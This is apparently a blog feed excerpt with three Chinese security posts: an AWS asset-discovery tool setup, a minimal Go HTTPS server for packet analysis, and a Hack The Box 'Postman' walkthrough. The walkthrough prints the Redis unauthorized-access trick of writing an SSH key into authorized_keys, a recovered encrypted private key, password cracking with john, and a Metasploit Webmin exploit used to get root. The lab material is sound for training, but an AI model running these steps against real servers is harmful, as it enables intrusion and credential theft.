~/.bash_profile</span><br><span class="line">export PATH=$PATH:/usr/local/go/bin</span><br><span class="line">source ~/.bash_profile</span><br><span class="line">go version</span><br></pre></td></tr></table></figure></p><p>安装成功之后会展示出如下信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-188-188-188 ec2-user]# go  version</span><br><span class="line">go version go1.15.5 linux/amd64</span><br></pre></td></tr></table></figure></p><p>二、安装 Smogcloud<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">go get -u github.com/BishopFox/smogcloud</span><br><span class="line">smogcloud</span><br></pre></td></tr></table></figure></p><p>出现这个报错的话，说明我们已经安装成功了，接下来我们需要配置账号ID和访问凭证，来进行资产收集了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-188-188-188 ec2-user]# smogcloud</span><br><span class="line"></span><br><span class="line"> Cannot list functions for region us-east-1</span><br><span class="line">NoCredentialProviders: no valid providers in chain. Deprecated.</span><br><span class="line">For verbose messaging see aws.Config.CredentialsChainVerboseErrors</span><br></pre></td></tr></table></figure></p><p>三、配置 Smogcloud<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export AWS_ACCOUNT_ID=&apos;&apos;            # Describe account</span><br><span class="line">export AWS_ACCESS_KEY_ID=&apos;&apos;         # Access key for aws account</span><br><span class="line">export AWS_SECRET_ACCESS_KEY=&apos;&apos;     # Secret key for aws account</span><br></pre></td></tr></table></figure></p><p>配置完成之后再次运行smogcloud执行，对这些暴露在外网的资产进行收集。<br>收集完成之后相关结果保存在results文件夹下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@ip-10-188-188-188 results]# tree</span><br><span class="line">.</span><br><span class="line">|-- apigateway</span><br><span class="line">|   `-- 123456789012.us-west-2.json</span><br><span class="line">|-- ec2</span><br><span class="line">|   `-- 123456789012.us-west-2.json</span><br><span class="line">|-- iot</span><br><span class="line">|   |-- 123456789012.us-west-2.json</span><br><span class="line">|   `-- 123456789012.us-east-1.json</span><br><span class="line">`-- s3</span><br><span class="line">    `-- 123456789012.global.json</span><br><span class="line"></span><br><span class="line">4 directories, 5 files</span><br></pre></td></tr></table></figure></p><h2 id="0x04-Smogcloud-的二次开发"><a href="#0x04-Smogcloud-的二次开发" class="headerlink" title="0x04 Smogcloud 的二次开发"></a>0x04 Smogcloud 的二次开发</h2><p>Smogcloud 本质上是调研AWS Golang SDK获取资产信息对于符合条件的资产进行收集。严格来讲，其仅仅是一个用于收集信息的脚本，我们可以顺着这个思路进行二次开发，将收集到的信息进行入库及分析展示。<br>这里举一个小例子，通过收集包含工网IP的EC2实例，结合其附加的安全组以及端口扫描情况可以梳理出来对外暴露的端口。对于不合规的端口进行告警，对于必须暴露的端口如Web应用进行其他手段的安全测试。对于其他的服务，如S3一类的，也是同样的思路。<br>再就是如何配合AWS Config服务，利用Config服务收集资产信息，配合rule进行合规性检查。</p><h2 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h2><p>[1] Smogcloud：<a href="https://github.com/BishopFox/smogcloud" target="_blank" rel="noopener">https://github.com/BishopFox/smogcloud</a><br>[2] Golang Installation, Setup, GOPATH, and Go Workspace <a href="https://www.callicoder.com/golang-installation-setup-gopath-workspace/" target="_blank" rel="noopener">https://www.callicoder.com/golang-installation-setup-gopath-workspace/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;对于一家大量采用AWS的甲方企业来说，如何实时的发现暴露在外网的AWS资产对其进行企业安全建设来说则
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Write a simple HTTPS server use Go</title>
    <link href="https://tonghuaroot.com/2020/09/14/write-a-simple-HTTPS-server-use-Go/"/>
    <id>https://tonghuaroot.com/2020/09/14/write-a-simple-HTTPS-server-use-Go/</id>
    <published>2020-09-14T10:09:16.000Z</published>
    <updated>2020-09-14T10:28:42.057Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>为了研究HTTPS的通信原理，随决定实现一个简易的 HTTPS 服务器，用最精简的代码可以专注于针对某一个 HTTPS 请求的研究。话不多说，直接生成自签名证书，上 Golang 代码梭哈。</p><h2 id="0x01-生成自签名证书"><a href="#0x01-生成自签名证书" class="headerlink" title="0x01 生成自签名证书"></a>0x01 生成自签名证书</h2><p>用于测试的工作目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/ec2-user/test/tls</span><br></pre></td></tr></table></figure></p><p>可以使用如下命令生成自签名证书：<br>使用该命令生成 private key<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out server_private_key.pem 2048</span><br></pre></td></tr></table></figure></p><p>使用该命令可以生成一个 certificate<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -key server_private_key.pem -out server.crt -days 1095</span><br></pre></td></tr></table></figure></p><p><img src="01.png" alt="01"></p><h2 id="0x02-服务端代码"><a href="#0x02-服务端代码" class="headerlink" title="0x02 服务端代码"></a>0x02 服务端代码</h2><p>如下代码用于实现 HTTPS 服务端</p><p>使用如下命令可以对 Golang 的代码进行格式化<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go fmt main.go</span><br></pre></td></tr></table></figure></p><p>示例代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">        &quot;fmt&quot;</span><br><span class="line">        &quot;log&quot;</span><br><span class="line">        &quot;net/http&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func test(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">        fmt.Fprintf(w, &quot;tonghuaroot&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">        http.HandleFunc(&quot;/1.txt&quot;, test)</span><br><span class="line">        err := http.ListenAndServeTLS(&quot;:8820&quot;, &quot;server.crt&quot;, &quot;server_private_key.pem&quot;, nil)</span><br><span class="line">        if err != nil &#123;</span><br><span class="line">                log.Fatal(&quot;ListenerAndServe:&quot;, err)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用如下命令可以运行 HTTPS 服务器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run main.go</span><br></pre></td></tr></table></figure></p><p><img src="02.png" alt="02"></p><p><img src="03.png" alt="03"></p><h2 id="0x03-使用-Wireshark-进行-HTTPS-请求报文捕获并分析"><a href="#0x03-使用-Wireshark-进行-HTTPS-请求报文捕获并分析" class="headerlink" title="0x03 使用 Wireshark 进行 HTTPS 请求报文捕获并分析"></a>0x03 使用 Wireshark 进行 HTTPS 请求报文捕获并分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.port == 8820</span><br></pre></td></tr></table></figure><h2 id="0x04-后记"><a href="#0x04-后记" class="headerlink" title="0x04 后记"></a>0x04 后记</h2><p>写这篇文章主要是搭建一个建议的HTTPS Server端，方便配合 Wireshark 分析 HTTPS 的通信流程。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;为了研究HTTPS的通信原理，随决定实现一个简易的 HTTPS 服务器，用最精简的代码可以专注于针对
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hack The Box - Postman Writeup - Linux</title>
    <link href="https://tonghuaroot.com/2020/06/29/Hack-The-Box-Postman-Writeup-Linux/"/>
    <id>https://tonghuaroot.com/2020/06/29/Hack-The-Box-Postman-Writeup-Linux/</id>
    <published>2020-06-28T22:40:23.000Z</published>
    <updated>2020-06-29T06:41:41.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>懒了，原本要保证每个月至少输出一篇blog，翻了翻做的笔记，不是不能拿出来讲的就是片段化的知识点，要是往外发的话，还要加工下，直线刷HTB的时候写了点writeup，稍微整理下发出来了。</p><h2 id="0x01-渗透思路"><a href="#0x01-渗透思路" class="headerlink" title="0x01 渗透思路"></a>0x01 渗透思路</h2><p>整理一下撸这个靶机的思路：</p><pre><code>1. 6379 redis未授权访问漏洞写公钥2. 翻目录找到Matt用户的私钥，john爆破出密码，redis用户su过去到Matt用户，拿到用户权限3. 利用Webmin的洞，配合Matt的登录凭证拿到root权限，over</code></pre><h2 id="0x02-Hack-The-Box-Postman-Writeup"><a href="#0x02-Hack-The-Box-Postman-Writeup" class="headerlink" title="0x02 Hack The Box Postman Writeup"></a>0x02 Hack The Box Postman Writeup</h2><p>IP：10.10.10.160<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/home/ec2-user/hack_the_box# nmap -p- -sV -T4 -A -Pn -oX Hack_The_Box_Postman.xml 10.10.10.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-11 06:17 UTC</span><br><span class="line">Nmap scan report for ip-10-10-10-160.ap-northeast-1.compute.internal (10.10.10.160)</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)</span><br><span class="line">|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)</span><br><span class="line">|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)</span><br><span class="line">80/tcp    open  http     Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: The Cyber Geek&apos;s Personal Website</span><br><span class="line">6379/tcp  open  redis    Redis key-value store 4.0.9</span><br><span class="line">10000/tcp open  ssl/http MiniServ 1.910 (Webmin httpd)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on Postman</span><br><span class="line">| Not valid before: 2019-08-25T16:26:22</span><br><span class="line">|_Not valid after:  2024-08-23T16:26:22</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=1/11%OT=22%CT=1%CU=30655%PV=Y%DS=2%DC=T%G=Y%TM=5E196A8</span><br><span class="line">OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=D)SEQ</span><br><span class="line">OS:(SP=103%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O</span><br><span class="line">OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=</span><br><span class="line">OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN</span><br><span class="line">OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D</span><br><span class="line">OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O</span><br><span class="line">OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W</span><br><span class="line">OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R</span><br><span class="line">OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 21/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   270.87 ms ip-10-10-14-1.ap-northeast-1.compute.internal (10.10.14.1)</span><br><span class="line">2   428.63 ms ip-10-10-10-160.ap-northeast-1.compute.internal (10.10.10.160)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 557.25 seconds</span><br><span class="line">root@kali:/home/ec2-user/hack_the_box#</span><br></pre></td></tr></table></figure></p><p>看到开了6379端口，准备试试有没有redis未授权访问的问题。<br>可以使用如下命令安装redis-cli [1]：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install redis-tools -y</span><br></pre></td></tr></table></figure></p><p>访问redis服务[2]：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.10.160 -p 6379</span><br></pre></td></tr></table></figure></p><p>既然已经可以登录到这个redis服务了，那现在我们尝试使用我之前写过的一篇文章getshell试试[3]：</p><p>悲催，没权限。<br>10000端口看着也是一个Web服务，去看看有啥发现没：</p><p>本地hosts文件修改下就可以正常访问这个站点了：</p><p>看到这个Web服务的Banner还挺显眼的，就去Google搜了一下，是个有故事的服务hhh，之前就已经被攻击者以预埋漏洞的方式留了后门，典型的供应链攻击啊。那么我们的这台靶机是否适用的，需要点时间研究看看。<br>先来确认一下版本：</p><p>Server: MiniServ/1.910<br>找到了一个利用代码[7]，这个利用代码适用于MSF，现在需要看看MSF是否内置了这个利用代码，或者我们把这个利用代码导入到MSF中。</p><p>撸了半天没撸下来，看下下exploit的描述“Any user authorized to the “Package Updates” module can execute arbitrary commands with root privileges.”还是得先拿到用户才能利用这个洞，也就是说我要先有个账号，这样看得话，这个洞就是用来提权用的，然后很不幸的是我又看到了writeup，看了下思路，还是在redis层面先搞一个账号，然后再利用Webmin进行提权。从nmap的扫描结果我们可以知道redis的版本是4.0.9。渗透这个东西，还是自己动手撸一下，不然思路就废了。<br>用linux/redis/redis_unauth_exec模块撸了半天没撸下来，就接着看writeup了。<br>思路还是通过redis执行命令写公钥登录服务器，之前还以为是溢出啥的高端洞呢。来试试：<br>ssh-keygen -t rsa -b 4096 -C “<a href="mailto:tonghua@tonghuaroot.com">tonghua@tonghuaroot.com</a>“ # 使用该命令生成密钥对，用于登录redis用<br>/root/.ssh/postman # 配置私钥的路径</p><p>redis-cli -h 10.10.10.160 # 登到这台redis上头去</p><p>设置需要写入的key：<br>set s-key “\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDInuzivP7rs0cryLZm+zF4nShbBdKOmDKDbdIWiRyYgrzhDBRSFzOWOUCz6IyPEtPIpYOlQ+GGvsbLlmEe5iOdBBloXADRZZKbcDEViQPYrrdrxAH+mQE8a0jfVAMr+DdmJMlGEHj4M4YUkHmi5E2ZgT9FikutLmhnlbZPcbAztAXcmQdGKp0zjEYXJKnblTKTj6wcVO4euV7fSKgwil6IgOuZtXR5L/GNy0Sm0qH4IBGeJBLV0XQCCfO68mOs0ARlCCkKF4+CLeKLz4IapXGlaZgp8snTodWtlvFrZwKKLeeJ5Fu7kyY+VOfAsme0yJZ4sOJ3QDpSrQujdE5IwtFgXQlhgu4Z9N8umovlM8O7YISjk6K+EjexjrzregnePIRg9y0TEVlQVjxZzdnigY0z+4GGhhRIQjmXLFYCUzYRyawLoJE5cfwGN5xOfamV0EoOPEHIfEx9b3u2lrb82p6KkSMSetFck1K9dOWDQrZHMOYJ1Z4Uk+2q62hXMpj3vdctXMQlmbpbDPWGdTjGVz4xafuVj2WIUu65WeGiyfWvo2xxr1Gk4X9LIfa0ZTpkiON18mfpplqARawqe6AslDvoO1+mqfqXgZxbWcAD6h/rktka+VQxzAlOT2lS2Y1/U/5Z1rxGNte7npZuYWWJJAc1YbtF9GQIXleJWvIuXOlS8Q== <a href="mailto:tonghua@tonghuaroot.com">tonghua@tonghuaroot.com</a>\n\n”</p><p>set dir /var/lib/redis/.ssh 设置目录（redis的默认安装目录）<br>config set dbfilename authorized_keys<br>Save<br>quit<br>ssh <a href="mailto:redis@10.10.10.160" target="_blank" rel="noopener">redis@10.10.10.160</a> -i ~/.ssh/postman # 登录目标机器<br>可以看到，成功登上去了：</p><p>这里应该反思一些，上面报权限不足的时候其实并不是set dir这个命令没权限，而是对应的目录没权限，其实比较好理解，我肯定不能已root权限跑redis，所以应该找到redis的默认安装目录，上面的就是默认的安装目录。<br>信息收集一波，看看其他的黑客都搞啥事情了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ cat .bash_history</span><br><span class="line">exit</span><br><span class="line">su Matt</span><br><span class="line">pwd</span><br><span class="line">nano scan.py</span><br><span class="line">python scan.py</span><br><span class="line">nano scan.py</span><br><span class="line">clear</span><br><span class="line">nano scan.py</span><br><span class="line">clear</span><br><span class="line">python scan.py</span><br><span class="line">exit</span><br><span class="line">exit</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">su Matt</span><br><span class="line">clear</span><br><span class="line">cd /var/lib/redis</span><br><span class="line">su Matt</span><br><span class="line">exit</span><br><span class="line">cat id_rsa.bak</span><br><span class="line">ls -la</span><br><span class="line">exit</span><br><span class="line">cat id_rsa.bak</span><br><span class="line">exit</span><br><span class="line">ls -la</span><br><span class="line">crontab -l</span><br><span class="line">systemctl enable redis-server</span><br><span class="line">redis-server</span><br><span class="line">ifconfig</span><br><span class="line">netstat -a</span><br><span class="line">netstat -a</span><br><span class="line">netstat -a</span><br><span class="line">netstat -a</span><br><span class="line">netstat -a &gt; txt</span><br><span class="line">exit</span><br><span class="line">crontab -l</span><br><span class="line">cd ~/</span><br><span class="line">ls</span><br><span class="line">nano 6379</span><br><span class="line">exit</span><br><span class="line">redis@Postman:~$</span><br></pre></td></tr></table></figure></p><p>使用这个脚本可以做进一步的信息收集：<a href="https://raw.githubusercontent.com/WazeHell/PE-Linux/master/PE.sh" target="_blank" rel="noopener">https://raw.githubusercontent.com/WazeHell/PE-Linux/master/PE.sh</a></p><p>找到Matt这个用户的私钥：<br>redis@Postman:/opt$ ls<br>id_rsa.bak<br>redis@Postman:/opt$ cat id_rsa.bak<br>—–BEGIN RSA PRIVATE KEY—–<br>Proc-Type: 4,ENCRYPTED<br>DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</p><p>JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX<br>cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2<br>7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6<br>cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9<br>1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv<br>EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP<br>UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY<br>Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK<br>t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS<br>5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke<br>P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6<br>jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge<br>SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i<br>l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X<br>0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p<br>S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR<br>hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+<br>Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V<br>XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD<br>b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi<br>WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh<br>KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm<br>npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ<br>VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W<br>X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==<br>—–END RSA PRIVATE KEY—–<br>redis@Postman:/opt$<br>常规思路就是既然我在这个目录下翻到了一个私钥，就要去试试能不能使用Matt这个用户登录至这台机器上：</p><p>可以看到这个私钥还有一个passphrase key我们是不知道的，试了几个都不对。使用john跑密码看看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/john</span><br><span class="line">./ssh2john.py ~/.ssh/id_res.bak &gt; Matt.hash</span><br><span class="line">gzip -d rockyou.txt.gz</span><br><span class="line">/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt Matt.hash</span><br></pre></td></tr></table></figure></p><p>很快密码就跑出来了，美滋滋：</p><p>拿到跑出来的passphrase密码继续ssh上去，结果会在瞬间掉线：</p><p>登不上去的原因也比较简单，我们通过redis那个用户登录上去翻到SSH的配置文件（/etc/ssh/sshd_config）可以知道这个用户被禁止通过SSH登录了。</p><p>直接在redis用户上使用密码su过去：</p><p>接下来拿到了这个user.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matt@Postman:/var/lib/redis$ cd ~</span><br><span class="line">Matt@Postman:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">Matt@Postman:~$ cat user.txt</span><br><span class="line">517ad0ec2458ca97af8d93aac08a2f3c</span><br></pre></td></tr></table></figure><p>sudo -s提权提不上去，sudoers file没有包含Matt用户的原因：</p><p>既然现在已经有了一个系统用户的登录凭证，现在这会就可以在此配合前面那个Webmin的洞了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use linux/http/webmin_packageup_rce</span><br><span class="line">options</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">cat /root/root.txt</span><br><span class="line">a257741c5bed8be7778c6ed95686ddce</span><br></pre></td></tr></table></figure></p><p>拿到flag之后去HTB提交就可以了：</p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p>[1] Linux - Install redis-cli only, <a href="https://stackoverflow.com/questions/21795340/linux-install-redis-cli-only" target="_blank" rel="noopener">https://stackoverflow.com/questions/21795340/linux-install-redis-cli-only</a><br>[2] Redis 命令, <a href="https://www.runoob.com/redis/redis-commands.html" target="_blank" rel="noopener">https://www.runoob.com/redis/redis-commands.html</a><br>[3] redis 在渗透中 getshell 方法总结, <a href="https://zhuanlan.zhihu.com/p/36529010" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/36529010</a><br>[4] Webmin 1.890 Exploit - What Happened?, <a href="http://www.webmin.com/exploit.html" target="_blank" rel="noopener">http://www.webmin.com/exploit.html</a><br>[5] metasploit渗透攻击之旅, <a href="https://www.cnblogs.com/zqjt/p/5431023.html" target="_blank" rel="noopener">https://www.cnblogs.com/zqjt/p/5431023.html</a><br>[6] metasploit-framework/documentation/modules/exploit/unix/webapp/webmin_upload_exec.md, <a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/webmin_upload_exec.md" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/unix/webapp/webmin_upload_exec.md</a><br>[7] Webmin 1.910 - ‘Package Updates’ Remote Command Execution (Metasploit), <a href="https://www.exploit-db.com/exploits/46984" target="_blank" 